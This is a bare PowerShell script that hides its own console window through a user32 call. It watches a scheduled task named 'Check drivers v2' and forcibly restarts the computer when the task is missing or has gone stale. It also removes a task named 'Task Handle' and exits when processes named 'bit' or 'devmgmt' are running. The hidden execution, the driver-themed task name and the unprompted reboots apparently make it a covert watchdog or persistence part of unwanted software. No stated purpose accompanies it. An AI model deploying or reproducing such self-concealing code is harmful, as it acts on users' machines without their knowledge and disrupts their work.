# Make PowerShell Disappear
$windowcode = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$asyncwindow = Add-Type -MemberDefinition $windowcode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$null = $asyncwindow::ShowWindowAsync((Get-Process -PID $pid).MainWindowHandle, 0)

$taskName = "Check drivers v2"
$timer = $false

do {
  $inet = Test-Connection -ComputerName www.google.com -Quiet
  try {
    $taskInfo = Get-ScheduledTaskInfo -TaskName $taskName -ErrorAction Stop
  } catch {
    $bitProcess = Get-Process -Name "bit" -ErrorAction SilentlyContinue
    $devMgmtProcess = Get-Process -Name "devmgmt" -ErrorAction SilentlyContinue
    if ($bitProcess -or $devMgmtProcess) {
      Unregister-ScheduledTask -TaskName 'Task Handle' -Confirm:$false
      exit
    } else {
      Restart-Computer
    }
  }
  $ts = New-TimeSpan -Start $taskInfo.LastRunTime -End (Get-Date)
  if (($($ts.Minutes) -gt '15') -and ($inet -eq $true)) {$timer = $true} else {Start-Sleep -Seconds 500}
} until ($timer -eq $true)

Restart-Computer
